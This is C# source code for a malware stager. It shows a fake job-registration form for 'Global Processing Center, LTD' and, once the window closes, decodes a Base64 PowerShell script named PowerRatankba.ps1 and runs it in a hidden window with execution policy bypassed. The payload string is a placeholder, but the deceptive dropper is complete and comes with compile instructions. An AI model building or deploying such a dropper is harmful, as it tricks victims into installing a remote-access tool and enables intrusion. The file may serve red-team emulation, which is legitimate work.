// This Stager is a graphical user interface (GUI) designed to look like a registration form for a fake company called "Global Processing Center, LTD." However, in reality, it contains malicious code that executes a hidden PowerShell script when run. The dropper downloads and executes PowerRatankba in the background by useing (Base64).

// sudo apt install mono-complete
// manual compile: mcs -platform:x64 -r:System.Windows.Forms -r:System.Drawing -out:Fake-Global-Processing-Center.exe Fake-Global-Processing-Center.cs

using System;
using System.IO;
using System.Diagnostics;
using System.Text.RegularExpressions;
using System.Windows.Forms;

namespace RedbancIntrusionForm
{
    public partial class MainForm : Form
    {
        public MainForm()
        {
            InitializeComponent();
        }

        private void InitializeComponent()
        {
            this.SuspendLayout();
            // 
            // MainForm
            // 
            this.ClientSize = new System.Drawing.Size(400, 500);
            this.Name = "MainForm";
            this.Text = "Global Processing Center, LTD";
            this.Load += new System.EventHandler(this.MainForm_Load);
            this.ResumeLayout(false);

            // First Name
            Label lblFirstName = new Label();
            lblFirstName.Text = "First Name:";
            lblFirstName.Location = new System.Drawing.Point(20, 20);
            this.Controls.Add(lblFirstName);

            TextBox txtFirstName = new TextBox();
            txtFirstName.Location = new System.Drawing.Point(120, 20);
            this.Controls.Add(txtFirstName);

            // Last Name
            Label lblLastName = new Label();
            lblLastName.Text = "Last Name:";
            lblLastName.Location = new System.Drawing.Point(20, 60);
            this.Controls.Add(lblLastName);

            TextBox txtLastName = new TextBox();
            txtLastName.Location = new System.Drawing.Point(120, 60);
            this.Controls.Add(txtLastName);

            // Gender
            Label lblGender = new Label();
            lblGender.Text = "Gender:";
            lblGender.Location = new System.Drawing.Point(20, 100);
            this.Controls.Add(lblGender);

            ComboBox cmbGender = new ComboBox();
            cmbGender.Items.AddRange(new string[] { "Male", "Female" });
            cmbGender.Location = new System.Drawing.Point(120, 100);
            this.Controls.Add(cmbGender);

            // Age
            Label lblAge = new Label();
            lblAge.Text = "Age:";
            lblAge.Location = new System.Drawing.Point(20, 140);
            this.Controls.Add(lblAge);

            TextBox txtAge = new TextBox();
            txtAge.Location = new System.Drawing.Point(120, 140);
            this.Controls.Add(txtAge);

            // Contact Mail
            Label lblContactMail = new Label();
            lblContactMail.Text = "Contact Mail:";
            lblContactMail.Location = new System.Drawing.Point(20, 180);
            this.Controls.Add(lblContactMail);

            TextBox txtContactMail = new TextBox();
            txtContactMail.Location = new System.Drawing.Point(120, 180);
            this.Controls.Add(txtContactMail);

            // Phone
            Label lblPhone = new Label();
            lblPhone.Text = "Phone:";
            lblPhone.Location = new System.Drawing.Point(20, 220);
            this.Controls.Add(lblPhone);

            TextBox txtPhone = new TextBox();
            txtPhone.Location = new System.Drawing.Point(120, 220);
            this.Controls.Add(txtPhone);

            // Salary
            Label lblSalary = new Label();
            lblSalary.Text = "Hourly Rate($):";
            lblSalary.Location = new System.Drawing.Point(20, 260);
            this.Controls.Add(lblSalary);

            TextBox txtSalary = new TextBox();
            txtSalary.Location = new System.Drawing.Point(120, 260);
            this.Controls.Add(txtSalary);

            // Hours per Week
            Label lblHoursPerWeek = new Label();
            lblHoursPerWeek.Text = "Hours per Week:";
            lblHoursPerWeek.Location = new System.Drawing.Point(20, 300);
            this.Controls.Add(lblHoursPerWeek);

            TextBox txtHoursPerWeek = new TextBox();
            txtHoursPerWeek.Location = new System.Drawing.Point(120, 300);
            this.Controls.Add(txtHoursPerWeek);

            // Duration
            Label lblDuration = new Label();
            lblDuration.Text = "Duration:";
            lblDuration.Location = new System.Drawing.Point(20, 340);
            this.Controls.Add(lblDuration);

            DateTimePicker dtpFrom = new DateTimePicker();
            dtpFrom.Location = new System.Drawing.Point(120, 340);
            this.Controls.Add(dtpFrom);

            Label lblTo = new Label();
            lblTo.Text = "To";
            lblTo.Location = new System.Drawing.Point(20, 380);
            this.Controls.Add(lblTo);

            DateTimePicker dtpTo = new DateTimePicker();
            dtpTo.Location = new System.Drawing.Point(120, 380);
            this.Controls.Add(dtpTo);

            // Buttons
            Button btnPrev = new Button();
            btnPrev.Text = "Prev";
            btnPrev.Location = new System.Drawing.Point(20, 420);
            this.Controls.Add(btnPrev);

            Button btnFinish = new Button();
            btnFinish.Text = "Finish";
            btnFinish.Location = new System.Drawing.Point(120, 420);
            this.Controls.Add(btnFinish);
        }

        private void MainForm_Load(object sender, EventArgs e)
        {
            // Load event handler
        }
    }

    // Add the Main method here
    static class Program
    {
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new MainForm());

            // Execute the Base64 decoding and PowerShell script execution
            ExecuteBase64Script();
        }

        static void ExecuteBase64Script()
        {
            // Base64-encoded content of the PowerShell script
            string base64Content = "Your base64 string for PowerRatankba.ps1 here";

            try
            {
                // Print first 50 characters for debugging
                Console.WriteLine("Base64 Preview: " + base64Content.Substring(0, Math.Min(50, base64Content.Length)) + "...");

                // Remove any non-Base64 characters (excluding valid padding '=')
                base64Content = Regex.Replace(base64Content, "[^A-Za-z0-9+/=]", "");

                // Ensure proper Base64 padding
                while (base64Content.Length % 4 != 0)
                {
                    base64Content += "=";
                }

                // Convert Base64 string to byte array
                byte[] fileBytes = Convert.FromBase64String(base64Content);
                string fileName = "PowerRatankba.ps1";

                // Save the byte array to a file
                File.WriteAllBytes(fileName, fileBytes);
                Console.WriteLine($"Script '{fileName}' downloaded successfully.");

                // Execute the PowerShell script
                Process process = new Process();
                process.StartInfo.FileName = "powershell.exe";
                process.StartInfo.Arguments = $"-ExecutionPolicy Bypass -File \"{fileName}\"";
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.RedirectStandardError = true;
                process.StartInfo.CreateNoWindow = true;

                process.Start();
                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();
                process.WaitForExit();

                Console.WriteLine("Output: " + output);
                if (!string.IsNullOrEmpty(error))
                {
                    Console.WriteLine("Error: " + error);
                }
                Console.WriteLine($"Process exited with code: {process.ExitCode}");
            }
            catch (FormatException ex)
            {
                Console.WriteLine("Invalid Base64 format: " + ex.Message);
            }
            catch (Exception ex)
            {
                Console.WriteLine("An error occurred: " + ex.Message);
            }
        }
    }
}
